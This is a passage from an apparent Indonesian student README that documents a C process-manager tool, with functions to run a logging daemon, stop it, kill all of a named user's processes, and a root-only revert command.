    if (pid < 0) {
        perror("Fork failed");
        exit(EXIT_FAILURE);
    }

    if (pid > 0) {
        printf("Running in daemon mode... PID: %d\n", pid);
        FILE *pidfile = fopen(PID_FILE, "w");
        if (!pidfile) exit(EXIT_FAILURE);
        fprintf(pidfile, "%d", pid);
        fclose(pidfile);
        exit(EXIT_SUCCESS);
    }

    if (setsid() < 0) exit(EXIT_FAILURE);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);

    while (1) {
        write_log("daemon_processes", "RUNNING");
        sleep(3);
    }
    }
    ```
 - fungsi untuk menghentikan proses daemon yang berjalan 
    ```
    void stop_daemon() {
    FILE *pidfile = fopen(PID_FILE, "r");
    if (!pidfile) {
        printf("Daemon tidak berjalan atau PID file '%s' tidak ditemukan.\n", PID_FILE);
        return;
    }

    int pid;
    fscanf(pidfile, "%d", &pid);
    fclose(pidfile);

    if (kill(pid, SIGTERM) == 0) {
        printf("Proses daemon (PID: %d) berhasil dihentikan.\n", pid);
        write_log("stop_processes","RUNNING");
    } else {
        perror("Gagal menghentikan proses daemon");
    }
    }
    ```
 - fungsi untuk menghentikan semua proses user
    ```
    void fail_processes(const char *username) {
    struct passwd *pwd = getpwnam(username);
    if (!pwd) {
        printf("User %s tidak ditemukan.\n", username);
        return;
    }

    uid_t target_uid = pwd->pw_uid;

    DIR *proc = opendir("/proc");
    if (!proc) {
        perror("Gagal membuka /proc");
        return;
    }

    struct dirent *entry;
    while ((entry = readdir(proc)) != NULL) {
        if (entry->d_type == DT_DIR) {
            long pid = strtol(entry->d_name, NULL, 10);
            if (pid <= 0) continue;

            char status_path[256];
            snprintf(status_path, sizeof(status_path), "/proc/%ld/status", pid);

            FILE *status = fopen(status_path, "r");
            if (!status) continue;

            char line[256];
            uid_t uid = -1;
            while (fgets(line, sizeof(line), status)) {
                if (strncmp(line, "Uid:", 4) == 0) {
                    sscanf(line, "Uid:\t%d", &uid);
                    break;
                }
            }
            fclose(status);

            
            if (uid == target_uid) {
                if (kill(pid, SIGKILL) == 0) {
                    printf("Proses (PID: %ld) milik user %s berhasil dihentikan.\n", pid, username);
                    write_log("fail_processes", "FAILED");
                } else {
                    perror("Gagal menghentikan proses");
                }
            }
        }
    }
    closedir(proc);
    }
    ```
 - fungsi untuk revert user menggunakan root
    ```
    void revert_processes(const char *username) {
    if (geteuid() != 0) { 
        printf("Fungsi revert hanya dapat dijalankan oleh root.\n");
        return;
    }

    write_log("revert_processes", "RUNNING");
    printf("User %s diizinkan kembali untuk menjalankan proses.\n", username);
    }

    int main(int argc, char *argv[]) {
    if (argc != 3) {
        printf("Usage: %s <command> <username>\n", argv[0]);
        printf("Commands: list | daemon | stop | fail | revert\n");
        return 1;
    }

    char *cmd = argv[1];
    char *username = argv[2];

    if (strcmp(cmd, "list") == 0) {
        list_user_processes(username);
    } else if (strcmp(cmd, "daemon") == 0) {
        daemon_mode(username);
    } else if (strcmp(cmd, "stop") == 0) {
        stop_daemon();
    } else if (strcmp(cmd, "fail") == 0) {
        fail_processes(username);
    } else if (strcmp(cmd, "revert") == 0) {
        revert_processes(username);
    } else {
        printf("pilihan tidak ada.\n");
    }

    return 0;
    }
    ```
